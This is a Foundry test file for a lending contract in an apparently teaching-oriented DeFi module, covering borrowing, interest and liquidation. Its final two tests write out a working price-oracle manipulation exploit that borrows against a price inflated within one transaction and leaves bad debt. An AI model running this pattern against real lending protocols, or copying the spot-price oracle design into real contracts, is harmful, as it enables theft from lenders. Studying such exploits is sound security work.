// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {GrainLoans} from "../src/GrainLoans.sol";
import {GrainToken} from "../src/GrainToken.sol";
import {ResidentRegistry} from "../src/ResidentRegistry.sol";
import {TownBank} from "../src/TownBank.sol";
import {TownSwap} from "../src/TownSwap.sol";
import {TownToken} from "../src/TownToken.sol";
import {TrustvillePassport} from "../src/TrustvillePassport.sol";

/// Reading a role off a contract is an external call, and one in the argument list of a
/// pranked call consumes the prank. Hoist every such read to a local first.
contract LoansTest is Test {
    bytes32 constant ADMIN = 0x00;
    uint64 constant COOLDOWN = 1 minutes;

    ResidentRegistry registry;
    TrustvillePassport passport;
    TownToken tvd;
    TownBank bank;
    GrainToken grain;
    TownSwap swap;
    GrainLoans loans;

    address deployer = makeAddr("deployer");
    address townAdmin = makeAddr("townAdmin");
    address alice = makeAddr("alice"); // swap liquidity
    address lender = makeAddr("lender");
    address lender2 = makeAddr("lender2");
    address borrower = makeAddr("borrower");
    address attacker = makeAddr("attacker");
    address carol = makeAddr("carol"); // moves the price honestly

    function setUp() public {
        vm.warp(1_000_000);

        vm.startPrank(deployer);
        registry = new ResidentRegistry(deployer);
        passport = new TrustvillePassport(deployer, registry);
        tvd = new TownToken(deployer, 10_000_000 ether);
        bank = new TownBank(deployer, registry, tvd, passport, 1000 ether);
        tvd.grantRole(tvd.MINTER_ROLE(), address(bank));
        passport.grantRole(passport.STAMPER_ROLE(), address(bank));
        registry.grantRole(registry.REGISTRAR_ROLE(), townAdmin);
        _handOver(address(registry));
        _handOver(address(passport));
        _handOver(address(tvd));
        _handOver(address(bank));
        registry.renounceRole(registry.REGISTRAR_ROLE(), deployer);

        grain = new GrainToken(townAdmin, registry, COOLDOWN);
        swap = new TownSwap(IERC20(address(tvd)), IERC20(address(grain)), passport);
        // Rate 0 by default so the arithmetic in most tests is exact; one test turns it on.
        loans = new GrainLoans(
            IERC20(address(tvd)), IERC20(address(grain)), swap, townAdmin, 0, passport
        );
        vm.stopPrank();

        bytes32 stamper = passport.STAMPER_ROLE();
        vm.startPrank(townAdmin);
        passport.grantRole(stamper, address(swap));
        passport.grantRole(stamper, address(loans));
        vm.stopPrank();

        address[6] memory folk = [alice, lender, lender2, borrower, attacker, carol];
        for (uint256 i; i < folk.length; i++) {
            vm.startPrank(folk[i]);
            registry.register(keccak256(abi.encodePacked(folk[i])));
            passport.mint();
            bank.claimWelcomeGrant();
            tvd.approve(address(swap), type(uint256).max);
            grain.approve(address(swap), type(uint256).max);
            tvd.approve(address(loans), type(uint256).max);
            grain.approve(address(loans), type(uint256).max);
            vm.stopPrank();
        }

        // A 1000 / 1000 pool: one GRAIN is worth one TVD.
        _farm(alice, 10);
        vm.prank(alice);
        swap.addLiquidity(1000 ether, 1000 ether, 0);

        // 2000 TVD available to borrow.
        vm.prank(lender);
        loans.supply(1000 ether);
        vm.prank(lender2);
        loans.supply(1000 ether);
    }

    function _handOver(address target) internal {
        TrustvillePassport(target).grantRole(ADMIN, townAdmin);
        TrustvillePassport(target).renounceRole(ADMIN, deployer);
    }

    function _farm(address who, uint256 times) internal {
        for (uint256 i; i < times; i++) {
            vm.prank(who);
            grain.harvest();
            vm.warp(block.timestamp + COOLDOWN + 1);
        }
    }

    /* ================================================================ ordinary use */

    function test_SupplyingGivesSharesOfThePool() public {
        assertEq(loans.poolValue(), 2000 ether);
        assertEq(loans.sharesOf(lender), 1000 ether);
    }

    function test_BorrowUpToHalfTheCollateralValue() public {
        _farm(borrower, 2); // 200 GRAIN, worth 200 TVD at 1:1

        vm.startPrank(borrower);
        loans.depositCollateral(200 ether);
        uint256 available = loans.availableToBorrow(borrower);
        assertEq(available, 100 ether, "50% LTV");

        loans.borrow(100 ether);
        vm.stopPrank();

        (uint256 collateral, uint256 debt) = loans.positionOf(borrower);
        assertEq(collateral, 200 ether);
        assertEq(debt, 100 ether);
        assertTrue(passport.hasStamp(borrower, 15));
    }

    function test_CannotBorrowBeyondTheLimit() public {
        _farm(borrower, 2);
        vm.startPrank(borrower);
        loans.depositCollateral(200 ether);
        vm.expectRevert(
            abi.encodeWithSelector(GrainLoans.WouldBeUndercollateralised.selector, 101 ether, 100 ether)
        );
        loans.borrow(101 ether);
        vm.stopPrank();
    }

    function test_RepayingFreesTheCollateral() public {
        _farm(borrower, 2);
        vm.startPrank(borrower);
        loans.depositCollateral(200 ether);
        loans.borrow(100 ether);
        loans.repay(100 ether);
        loans.withdrawCollateral(200 ether);
        vm.stopPrank();

        (uint256 collateral, uint256 debt) = loans.positionOf(borrower);
        assertEq(collateral, 0);
        assertEq(debt, 0);
        assertEq(grain.balanceOf(borrower), 200 ether);
    }

    function test_CannotWithdrawCollateralThatIsHoldingUpALoan() public {
        _farm(borrower, 2);
        vm.startPrank(borrower);
        loans.depositCollateral(200 ether);
        loans.borrow(100 ether);
        vm.expectRevert();
        loans.withdrawCollateral(100 ether); // would leave 100 collateral against 100 debt
        vm.stopPrank();
    }

    function test_InterestAccruesAndLendersGetIt() public {
        vm.prank(townAdmin);
        loans.setRate(1000); // 10% a year

        _farm(borrower, 2);
        vm.startPrank(borrower);
        loans.depositCollateral(200 ether);
        loans.borrow(100 ether);
        vm.stopPrank();

        uint256 valueBefore = loans.poolValue();
        vm.warp(block.timestamp + 365 days);

        (, uint256 debt) = loans.positionOf(borrower);
        assertEq(debt, 110 ether, "10% of 100 over a year");

        // The pool only books it when the position is touched.
        vm.prank(borrower);
        loans.repay(10 ether);
        assertGt(loans.poolValue(), valueBefore, "the interest belongs to the lenders");
    }

    function test_LendersCannotWithdrawCashThatIsLentOut() public {
        _farm(borrower, 30);
        vm.startPrank(borrower);
        loans.depositCollateral(3000 ether);
        loans.borrow(1500 ether); // only 500 TVD of cash left behind
        vm.stopPrank();

        uint256 shares = loans.sharesOf(lender);
        vm.prank(lender);
        vm.expectRevert();
        loans.withdrawSupply(shares); // 1000 of the 2000 is out on loan
    }

    /* ================================================================= liquidation */

    function test_APriceFallMakesAPositionLiquidatable() public {
        _farm(borrower, 2);
        vm.startPrank(borrower);
        loans.depositCollateral(200 ether);
        loans.borrow(100 ether);
        vm.stopPrank();

        assertGt(loans.healthFactor(borrower), 1e18, "healthy at 1:1");

        // Carol sells a lot of GRAIN: the price of GRAIN falls, honestly.
        _farm(carol, 5);
        vm.prank(carol);
        swap.swapGrainForTvd(500 ether, 0, 0);

        assertLt(loans.healthFactor(borrower), 1e18, "the collateral no longer covers it");

        uint256 liquidatorGrainBefore = grain.balanceOf(carol);
        vm.prank(carol);
        uint256 seized = loans.liquidate(borrower, 50 ether);

        uint256 price = swap.unsafeSpotTvdPerGrain();
        uint256 worthRepaid = (50 ether * 1e18) / price;
        assertGt(seized, worthRepaid, "the liquidator is paid a bonus to do the job");
        assertEq(grain.balanceOf(carol) - liquidatorGrainBefore, seized);

        (, uint256 debt) = loans.positionOf(borrower);
        assertEq(debt, 50 ether, "half the debt is gone");
    }

    function test_AHealthyPositionCannotBeLiquidated() public {
        _farm(borrower, 2);
        vm.startPrank(borrower);
        loans.depositCollateral(200 ether);
        loans.borrow(100 ether);
        vm.stopPrank();

        vm.prank(carol);
        vm.expectRevert();
        loans.liquidate(borrower, 10 ether);
    }

    /* ==================================================================== THE ATTACK
     *
     * This test is not a bug to be fixed. It is the exploit, working, and it is the point
     * of the module. The borrower moves the price of their own collateral inside a single
     * transaction, borrows against the number they just invented, puts the price back, and
     * keeps the money.
     */

    function test_ATTACK_InflateTheCollateralPriceAndWalkAway() public {
        _farm(attacker, 6); // 600 GRAIN, honestly worth about 600 TVD

        uint256 startTvd = tvd.balanceOf(attacker);
        uint256 honestPriceBefore = swap.unsafeSpotTvdPerGrain();

        vm.startPrank(attacker);

        // 1. Buy GRAIN hard. GRAIN becomes scarce in the pool, so its price rockets.
        swap.swapTvdForGrain(900 ether, 0, 0);
        uint256 inflated = swap.unsafeSpotTvdPerGrain();

        // 2. Deposit the collateral and borrow against the invented valuation.
        loans.depositCollateral(600 ether);
        uint256 borrowed = loans.availableToBorrow(attacker);
        loans.borrow(borrowed);

        // 3. Sell the GRAIN back. The price returns to roughly where it started.
        swap.swapGrainForTvd(grain.balanceOf(attacker), 0, 0);

        vm.stopPrank();

        uint256 honestPriceAfter = swap.unsafeSpotTvdPerGrain();
        uint256 collateralWorth = (600 ether * honestPriceAfter) / 1e18;
        (, uint256 debt) = loans.positionOf(attacker);
        uint256 gained = tvd.balanceOf(attacker) - startTvd;

        console.log("price before   ", honestPriceBefore);
        console.log("price inflated ", inflated);
        console.log("price after    ", honestPriceAfter);
        console.log("borrowed       ", borrowed);
        console.log("collateral now ", collateralWorth);
        console.log("net TVD gained ", gained);

        assertGt(inflated, honestPriceBefore * 3, "the price more than tripled inside one transaction");
        assertGt(debt, collateralWorth * 15 / 10, "the loan is far beyond its collateral");
        assertGt(
            gained,
            collateralWorth,
            "the attacker keeps more TVD than the collateral they abandoned is worth"
        );
    }

    /// And the position left behind cannot be cleaned up without a loss: seizing every
    /// last grain of collateral does not cover the debt.
    function test_ATTACK_LeavesBadDebtTheLiquidatorsCannotClear() public {
        _farm(attacker, 6);
        vm.startPrank(attacker);
        swap.swapTvdForGrain(900 ether, 0, 0);
        loans.depositCollateral(600 ether);
        loans.borrow(loans.availableToBorrow(attacker));
        swap.swapGrainForTvd(grain.balanceOf(attacker), 0, 0);
        vm.stopPrank();

        (uint256 collateral, uint256 debt) = loans.positionOf(attacker);
        uint256 collateralWorth = (collateral * swap.unsafeSpotTvdPerGrain()) / 1e18;

        assertLt(collateralWorth, debt, "whoever liquidates this eats the difference");
    }
}
